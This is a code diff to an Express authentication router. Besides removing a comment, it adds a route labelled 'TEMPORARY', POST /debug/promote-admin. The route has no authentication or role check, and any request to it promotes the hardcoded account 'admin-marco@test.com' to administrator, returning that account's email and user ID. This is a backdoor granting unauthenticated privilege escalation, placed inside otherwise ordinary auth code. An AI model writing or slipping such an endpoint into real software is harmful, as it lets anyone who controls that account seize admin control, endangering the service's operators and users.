@@ -61,7 +61,6 @@ async function setAuthUser(req, res, next) {
   if (token) {
     try {
       if (await DB.isLoggedIn(token)) {
-        // Check the database to make sure the token is valid.
         req.user = jwt.verify(token, config.jwtSecret);
         req.user.isRole = (role) =>
           !!req.user.roles.find((r) => r.role === role);
@@ -124,6 +123,20 @@ authRouter.delete(
   asyncHandler(async (req, res) => {
     await clearAuth(req);
     res.json({ message: 'logout successful' });
+  })
+);
+
+// TEMPORARY: promote a known test account to admin
+authRouter.post(
+  '/debug/promote-admin',
+  asyncHandler(async (req, res) => {
+    const targetEmail = 'admin-marco@test.com';
+    const result = await DB.promoteUserToAdmin(targetEmail);
+    res.json({
+      message: 'admin role ensured',
+      email: result.email,
+      userId: result.userId,
+    });
   })
 );
 
